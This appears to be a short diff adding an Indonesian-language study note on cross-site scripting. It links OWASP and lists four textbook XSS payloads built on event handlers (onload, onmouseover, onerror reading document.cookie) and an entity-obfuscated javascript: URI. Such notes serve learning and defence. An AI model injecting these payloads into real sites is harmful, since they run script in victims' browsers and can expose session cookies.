@@ -1,0 +1,11 @@
+link => https://owasp.org/www-community/attacks/xss/
+
+selain mengunakan <script> </script>
+
+bisa mengunakan atribute(onload,onmouseover,oneerror) contoh =>
+
+<body onload=alert('test1')>
+<b onmouseover=alert('Wufff!')>click me!</b>
+<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
+<IMG SRC=j&#X41vascript:alert('test2')>
+
